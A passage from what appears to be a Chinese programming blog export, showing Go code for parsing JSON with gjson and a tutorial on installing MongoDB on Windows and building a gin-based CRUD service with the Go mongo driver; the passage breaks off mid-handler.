</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/tidwall/gjson&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">strGjson</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// go get -u github.com/tidwall/gjson</span></span><br><span class="line">	jsonstr := <span class="string">`&#123;&quot;code&quot;: 1, &quot;msg&quot;:&quot;success&quot;, &quot;data&quot;:[&#123;&quot;id&quot;: 1, &quot;name&quot;:&quot;西瓜&quot;&#125;,&#123;&quot;id&quot;: 2, &quot;name&quot;: &quot;苹果&quot;&#125;]&#125;`</span></span><br><span class="line">	results := gjson.GetMany(jsonstr, <span class="string">&quot;code&quot;</span>, <span class="string">&quot;msg&quot;</span>, <span class="string">&quot;data&quot;</span>)</span><br><span class="line">	fmt.Println(results) <span class="comment">//[1 success [&#123;&quot;id&quot;: 1, &quot;name&quot;:&quot;西瓜&quot;&#125;,&#123;&quot;id&quot;: 2, &quot;name&quot;: &quot;苹果&quot;&#125;]]</span></span><br><span class="line">	data := results[<span class="number">2</span>]</span><br><span class="line">	fmt.Println(data) <span class="comment">//[&#123;&quot;id&quot;: 1, &quot;name&quot;:&quot;西瓜&quot;&#125;,&#123;&quot;id&quot;: 2, &quot;name&quot;: &quot;苹果&quot;&#125;]</span></span><br><span class="line">	<span class="keyword">if</span> data.Exists() &#123;</span><br><span class="line">		re := data.Array()</span><br><span class="line">		<span class="keyword">for</span> _, v := <span class="keyword">range</span> re &#123;</span><br><span class="line">			fmt.Println(v) <span class="comment">// &#123;&quot;id&quot;: 1, &quot;name&quot;:&quot;西瓜&quot;&#125;</span></span><br><span class="line">			fmt.Println(v.Get(<span class="string">&quot;name&quot;</span>))</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">readByteJson</span><span class="params">()</span></span> &#123;</span><br><span class="line">	f, err := os.Open(<span class="string">&quot;hello_work\\data.json&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;open file eror:&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> f.Close()</span><br><span class="line">	<span class="comment">// 不写结构体，直接用这种方式定义</span></span><br><span class="line">	formData := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line">	<span class="comment">// 解码json</span></span><br><span class="line">	json.NewDecoder(f).Decode(&amp;formData)</span><br><span class="line">	<span class="comment">// 第一次循环，取map值</span></span><br><span class="line">	<span class="keyword">for</span> key, value := <span class="keyword">range</span> formData &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;key:&quot;</span>, key, <span class="string">&quot; =&gt; value :&quot;</span>, value)</span><br><span class="line">		<span class="comment">// 第二次循环，取数组的值</span></span><br><span class="line">		<span class="keyword">if</span> _, ok := value.([]<span class="keyword">interface</span>&#123;&#125;); ok &#123;</span><br><span class="line">			<span class="keyword">for</span> k, v := <span class="keyword">range</span> value.([]<span class="keyword">interface</span>&#123;&#125;) &#123;</span><br><span class="line">				fmt.Println(<span class="string">&quot;key:&quot;</span>, k, <span class="string">&quot; =&gt; value :&quot;</span>, v)</span><br><span class="line">				<span class="comment">// 第三次循环，取数组中map的值</span></span><br><span class="line">				<span class="keyword">for</span> j, s := <span class="keyword">range</span> v.(<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;) &#123;</span><br><span class="line">					fmt.Printf(<span class="string">&quot;%s: %v\n&quot;</span>, j, s)</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">byteGjson</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// go get -u github.com/tidwall/gjson</span></span><br><span class="line">	f, err := os.Open(<span class="string">&quot;hello_work\\data.json&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;open file eror:&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> f.Close()</span><br><span class="line">	<span class="comment">// 读取json内容，类型为[]byte</span></span><br><span class="line">	byteValue, _ := ioutil.ReadAll(f)</span><br><span class="line">	data := gjson.GetBytes(byteValue, <span class="string">&quot;data&quot;</span>)</span><br><span class="line">	code := gjson.GetBytes(byteValue, <span class="string">&quot;code&quot;</span>)</span><br><span class="line">	fmt.Println(data) <span class="comment">// [&#123;&quot;id&quot;: 1, &quot;name&quot;:&quot;西瓜&quot;&#125;,&#123;&quot;id&quot;: 2, &quot;name&quot;: &quot;苹果&quot;&#125;]</span></span><br><span class="line">	fmt.Println(code)</span><br><span class="line">	<span class="keyword">if</span> data.Exists() &#123;</span><br><span class="line">		re := data.Array()</span><br><span class="line">		<span class="keyword">for</span> _, v := <span class="keyword">range</span> re &#123;</span><br><span class="line">			fmt.Println(v) <span class="comment">// &#123;&quot;id&quot;: 1, &quot;name&quot;:&quot;西瓜&quot;&#125;</span></span><br><span class="line">			fmt.Println(v.Get(<span class="string">&quot;name&quot;</span>))</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// readJson()</span></span><br><span class="line">    <span class="comment">// byteGjson()</span></span><br><span class="line">	strGjson()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>go</tag>
      </tags>
  </entry>
  <entry>
    <title>go操作mongodb</title>
    <url>/aposts/f076e5a8/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li>本次主要在win10, go 1.20.4下，利用go 操作mongodb</li>
</ul>
<h3 id="安装启动"><a href="#安装启动" class="headerlink" title="安装启动"></a>安装启动</h3><ul>
<li>打开<a href="https://www.mongodb.com/download-center/community/releases/archive">地址</a>下载安装包</li>
<li>解压后目录如下，添加两个文件夹data和logs文件夹，用来存储mongodb的数据和日志文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\app\mongodb-win32-x86_64-windows-6.0.6&gt;tree</span><br><span class="line">卷 项目盘 的文件夹 PATH 列表</span><br><span class="line">卷序列号为 8C07-3198</span><br><span class="line">D:.</span><br><span class="line">├─bin</span><br><span class="line">├─data</span><br><span class="line">│  ├─diagnostic.data</span><br><span class="line">│  └─journal</span><br><span class="line">└─logs</span><br></pre></td></tr></table></figure>

<ul>
<li>启动服务</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\app\mongodb-win32-x86_64-windows-6.0.6\bin&gt;mongod.exe --dbpath D:\app\mongodb-win32-x86_64-windows-6.0.6\data --logpath D:\app\mongodb-win32-x86_64-windows-6.0.6\logs\mongodb.log</span><br></pre></td></tr></table></figure>

<ul>
<li><p>启动成功后data目录下会自动生成MongoDB数据库的一些信息，logs目录下存的则是日志文件，文件内容是启动信息</p>
</li>
<li><p>安装<a href="https://www.mongodb.com/try/download/compass">连接工具mongodb compass</a>，连接mongodb，地址是本地<code>127.0.0.1</code>，默认端口是27017</p>
</li>
</ul>
<p><img src="/aposts/f076e5a8/image-20230712171639801.png" alt="image-20230712171639801"></p>
<ul>
<li>默认连接没有用户名和密码，需要进行设置</li>
<li>点击底部菜单，输入<code>use admin</code></li>
</ul>
<p><img src="/aposts/f076e5a8/image-20230712180544757.png" alt="image-20230712180544757"></p>
<ul>
<li>然后输入</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.createUser(&#123;</span><br><span class="line">  user: &#x27;admin&#x27;,  // 用户名</span><br><span class="line">  pwd: &#x27;123456&#x27;,  // 密码</span><br><span class="line">  roles:[&#123;</span><br><span class="line">    role: &#x27;root&#x27;,  // 角色---超级管理员才可以使用该角色</span><br><span class="line">    db: &#x27;admin&#x27;  // 数据库</span><br><span class="line">  &#125;]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/f076e5a8/image-20230712180758846.png" alt="image-20230712180758846"></p>
<ul>
<li>其他常用语句</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&gt; show dbs</span><br><span class="line">admin   132.00 KiB</span><br><span class="line">config  108.00 KiB</span><br><span class="line">local    72.00 KiB</span><br><span class="line">user     40.00 KiB</span><br><span class="line">&gt;db.auth(&quot;admin&quot;,&quot;123456&quot;) -- 授权</span><br><span class="line">&#123; ok: 1 &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>mongodb compass 中为admin数据库中加入users的collection</li>
</ul>
<p><img src="/aposts/f076e5a8/image-20230712194613916.png" alt="image-20230712194613916"></p>
<h2 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h2><h3 id="服务端代码"><a href="#服务端代码" class="headerlink" title="服务端代码"></a>服务端代码</h3><ul>
<li>初始化项目</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd E:\proj\gowork</span><br><span class="line">mkdir studyMongoDB</span><br><span class="line">cd studyMongoDB</span><br><span class="line">go mod init example.com/studyMongoDB</span><br></pre></td></tr></table></figure>

<ul>
<li>用vscode 打开文件夹，安装依赖</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">go get -u github.com/gin-gonic/gin</span><br><span class="line">go get go.mongodb.org/mongo-driver/mongo</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>编写测试代码</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//main.go</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;go.mongodb.org/mongo-driver/bson&quot;</span></span><br><span class="line">	<span class="string">&quot;go.mongodb.org/mongo-driver/mongo&quot;</span></span><br><span class="line">	<span class="string">&quot;go.mongodb.org/mongo-driver/mongo/options&quot;</span></span><br><span class="line">	<span class="string">&quot;go.mongodb.org/mongo-driver/mongo/readpref&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</span><br><span class="line">	Id   <span class="type">int32</span></span><br><span class="line">	Name <span class="type">string</span></span><br><span class="line">	Age  <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// pool 连接池模式</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ConnectToDB</span><span class="params">(uri, name <span class="type">string</span>, timeout time.Duration, num <span class="type">uint64</span>)</span></span> (*mongo.Database, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="comment">// 设置连接超时时间</span></span><br><span class="line">	ctx, cancel := context.WithTimeout(context.Background(), timeout)</span><br><span class="line">	<span class="keyword">defer</span> cancel()</span><br><span class="line">	<span class="comment">// 通过传进来的uri连接相关的配置</span></span><br><span class="line">	o := options.Client().ApplyURI(uri)</span><br><span class="line">	<span class="comment">// 设置最大连接数 - 默认是100 ，不设置就是最大 max 64</span></span><br><span class="line">	o.SetMaxPoolSize(num)</span><br><span class="line">	<span class="comment">// 发起链接</span></span><br><span class="line">	client, err := mongo.Connect(ctx, o)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 判断服务是不是可用</span></span><br><span class="line">	<span class="keyword">if</span> err = client.Ping(context.Background(), readpref.Primary()); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 返回 client</span></span><br><span class="line">	<span class="keyword">return</span> client.Database(name), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	toDB, err := ConnectToDB(<span class="string">&quot;mongodb://admin:123456@localhost:27017&quot;</span>, <span class="string">&quot;admin&quot;</span>, time.Duration(<span class="number">2</span>), <span class="number">50</span>)</span><br><span class="line">	fmt.Println(err)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		fmt.Println(toDB)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;sussces&quot;</span>)</span><br><span class="line">	doc := Student&#123;Name: <span class="string">&quot;刘刘&quot;</span>, Age: <span class="number">18</span>, Id: <span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line">	coll := toDB.Collection(<span class="string">&quot;users&quot;</span>)</span><br><span class="line">	objId, err := coll.InsertOne(context.TODO(), doc)</span><br><span class="line">	fmt.Println(objId)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;新增成功&quot;</span>)</span><br><span class="line">	<span class="keyword">var</span> one Student</span><br><span class="line">	filter := bson.D&#123;&#123;<span class="string">&quot;id&quot;</span>, <span class="number">1</span>&#125;&#125;</span><br><span class="line">	<span class="keyword">var</span> ctx context.Context</span><br><span class="line">	<span class="keyword">var</span> cancel <span class="function"><span class="keyword">func</span><span class="params">()</span></span></span><br><span class="line">	ctx, cancel = context.WithTimeout(context.Background(), <span class="number">5</span>*time.Second)</span><br><span class="line">	<span class="keyword">defer</span> cancel()</span><br><span class="line">	err = coll.FindOne(ctx, filter).Decode(&amp;one)</span><br><span class="line">	<span class="keyword">if</span> err == mongo.ErrNoDocuments &#123;</span><br><span class="line">		<span class="comment">// Do something when no record was found</span></span><br><span class="line">		fmt.Println(<span class="string">&quot;record does not exist&quot;</span>)</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(one)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>运行结果</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">PS E:\proj\gowork\studyMongoDb&gt; <span class="keyword">go</span> run .\main.<span class="keyword">go</span></span><br><span class="line">&lt;<span class="literal">nil</span>&gt;</span><br><span class="line">sussces</span><br><span class="line">&amp;&#123;ObjectID(<span class="string">&quot;64ae992a5063fc95642035ed&quot;</span>)&#125;</span><br><span class="line">新增成功</span><br><span class="line">&#123;<span class="number">1</span> 刘刘 <span class="number">18</span>&#125;</span><br><span class="line">PS E:\proj\gowork\studyMongoDb&gt; </span><br></pre></td></tr></table></figure>

<h3 id="gin和mongodb"><a href="#gin和mongodb" class="headerlink" title="gin和mongodb"></a>gin和mongodb</h3><ul>
<li><code>dbs\db.go</code>为连接数据库代码</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> dbs</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;go.mongodb.org/mongo-driver/mongo&quot;</span></span><br><span class="line">	<span class="string">&quot;go.mongodb.org/mongo-driver/mongo/options&quot;</span></span><br><span class="line">	<span class="string">&quot;go.mongodb.org/mongo-driver/mongo/readpref&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	Client     *mongo.Client     <span class="comment">// database 话柄</span></span><br><span class="line">	Collection *mongo.Collection <span class="comment">// collection 话柄</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// pool 连接池模式</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ConnectToDB</span><span class="params">(uri, name <span class="type">string</span>)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	cb := context.Background()</span><br><span class="line">	<span class="comment">// 设置连接超时时间</span></span><br><span class="line">	ctx1, cancel := context.WithTimeout(cb, time.Duration(<span class="number">2</span>))</span><br><span class="line">	<span class="keyword">defer</span> cancel()</span><br><span class="line">	<span class="comment">// 通过传进来的uri连接相关的配置</span></span><br><span class="line">	o := options.Client().ApplyURI(uri)</span><br><span class="line">	<span class="comment">// 设置最大连接数 - 默认是100 ，不设置就是最大 max 64</span></span><br><span class="line">	o.SetMaxPoolSize(<span class="number">50</span>)</span><br><span class="line">	<span class="comment">// 发起链接</span></span><br><span class="line">	client, err := mongo.Connect(ctx1, o)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 判断服务是不是可用</span></span><br><span class="line">	<span class="keyword">if</span> err = client.Ping(cb, readpref.Primary()); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 默认连接的数据库</span></span><br><span class="line">	_db := client.Database(name)</span><br><span class="line"></span><br><span class="line">	Client = client</span><br><span class="line">	<span class="comment">// 默认连接集合为users</span></span><br><span class="line">	Collection = _db.Collection(<span class="string">&quot;users&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>models/user.go</code> 操作实体类</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;example.com/studyMongoDb/dbs&quot;</span></span><br><span class="line">	<span class="string">&quot;go.mongodb.org/mongo-driver/bson&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">	Key      <span class="type">string</span> <span class="string">`json:&quot;key&quot;`</span></span><br><span class="line">	Name     <span class="type">string</span> <span class="string">`json:&quot;name&quot;`</span></span><br><span class="line">	Password <span class="type">string</span> <span class="string">`json:&quot;password&quot;`</span></span><br><span class="line">	Id       <span class="type">int</span>    <span class="string">`json:&quot;id&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u *User)</span></span> GetList(ctx context.Context) (users []User, err1 <span class="type">error</span>) &#123;</span><br><span class="line">	cur, err := dbs.Collection.Find(ctx, bson.D&#123;&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> err := cur.Err(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	err = cur.All(ctx, &amp;users)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	cur.Close(ctx)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u *User)</span></span> Query() (user []User, err1 <span class="type">error</span>) &#123;</span><br><span class="line">	cb := context.Background()</span><br><span class="line">	fil := bson.M&#123;<span class="string">&quot;key&quot;</span>: u.Key&#125;</span><br><span class="line">	<span class="comment">// 模糊查询</span></span><br><span class="line">	<span class="comment">// bson.M&#123;&quot;Name&quot;: primitive.Regex&#123;Pattern: u.name&#125;&#125;</span></span><br><span class="line">	cur, err := dbs.Collection.Find(cb, fil)</span><br><span class="line">	<span class="comment">// dbs.Collection.FindOne(cb, fil).Decode(&amp;user)</span></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> err := cur.Err(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	err = cur.All(cb, &amp;user)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	cur.Close(cb)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u *User)</span></span> Add() (err <span class="type">error</span>) &#123;</span><br><span class="line">	objId, err1 := dbs.Collection.InsertOne(context.TODO(), &amp;u)</span><br><span class="line">	<span class="keyword">if</span> err1 != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;insert into error:&quot;</span>, err)</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;录入数据成功,&quot;</span>, objId)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u *User)</span></span> EditOne() (err1 <span class="type">error</span>) &#123;</span><br><span class="line">	fil := bson.M&#123;<span class="string">&quot;key&quot;</span>: u.Key&#125;</span><br><span class="line">	update := bson.M&#123;<span class="string">&quot;$set&quot;</span>: u&#125;</span><br><span class="line">	<span class="comment">// .update(&#123;条件&#125;,&#123;修改后的数据&#125;)</span></span><br><span class="line">	updateResult, err := dbs.Collection.UpdateOne(context.Background(), fil, update)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">	&#125;</span><br><span class="line">	log.Println(<span class="string">&quot;collection.UpdateOne:&quot;</span>, updateResult)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u *User)</span></span> Delete() (err1 <span class="type">error</span>) &#123;</span><br><span class="line">	fil := bson.M&#123;<span class="string">&quot;key&quot;</span>: u.Key&#125;</span><br><span class="line">	deleteResult, err := dbs.Collection.DeleteOne(context.Background(), fil)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">	&#125;</span><br><span class="line">	log.Println(<span class="string">&quot;collection.DeleteOne:&quot;</span>, deleteResult)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><code>api\users.go</code> 调用model层代码</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> api</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;example.com/studyMongoDb/models&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">UserAdd</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> user models.User</span><br><span class="line">	<span class="keyword">if</span> c.Bind(&amp;user) == <span class="literal">nil</span> &#123; <span class="comment">//把客户端格式传过来的数据绑定到结构体user中去</span></span><br><span class="line">		fmt.Println(<span class="string">&quot;data=&quot;</span>, user)</span><br><span class="line">		err := user.Add() <span class="comment">// 调用model层的对应方法</span></span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"></span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;msg&quot;</span>:  <span class="string">&quot;新增失败&quot;</span>,</span><br><span class="line">				<span class="string">&quot;code&quot;</span>: <span class="number">-1</span>,</span><br><span class="line">			&#125;)</span><br><span class="line"></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;msg&quot;</span>:  <span class="string">&quot;新增成功&quot;</span>,</span><br><span class="line">				<span class="string">&quot;code&quot;</span>: <span class="number">1</span>,</span><br><span class="line">			&#125;)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		c.JSON(<span class="number">400</span>, gin.H&#123;<span class="string">&quot;JSON=== status&quot;</span>: <span class="string">&quot;binding JSON error!&quot;</span>&#125;)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">UserList</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> user models.User</span><br><span class="line">	<span class="keyword">if</span> c.Bind(&amp;user) == <span class="literal">nil</span> &#123; <span class="comment">//把客户端格式传过来的数据绑定到结构体user中去</span></span><br><span class="line">		users, err := user.GetList(context.Background()) <span class="comment">// 调用model层的对应方法</span></span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"></span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;msg&quot;</span>:  <span class="string">&quot;获取列表失败&quot;</span>,</span><br><span class="line">				<span class="string">&quot;code&quot;</span>: <span class="number">-1</span>,</span><br><span class="line">			&#125;)</span><br><span class="line"></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;msg&quot;</span>:   <span class="string">&quot;获取列表成功&quot;</span>,</span><br><span class="line">				<span class="string">&quot;code&quot;</span>:  <span class="number">1</span>,</span><br><span class="line">				<span class="string">&quot;users&quot;</span>: users,</span><br><span class="line">			&#125;)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		c.JSON(<span class="number">400</span>, gin.H&#123;<span class="string">&quot;JSON=== status&quot;</span>: <span class="string">&quot;binding JSON error!&quot;</span>&#125;)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">UserEditOne</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> user models.User</span><br><span class="line">	<span class="keyword">if</span> c.Bind(&amp;user) == <span class="literal">nil</span> &#123;</span><br><span class="line">		err := user.EditOne()</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"></span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;msg&quot;</span>:  <span class="string">&quot;编辑失败&quot;</span>,</span><br><span class="line">				<span class="string">&quot;code&quot;</span>: <span class="number">-1</span>,</span><br><span class="line">			&#125;)</span><br><span class="line"></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			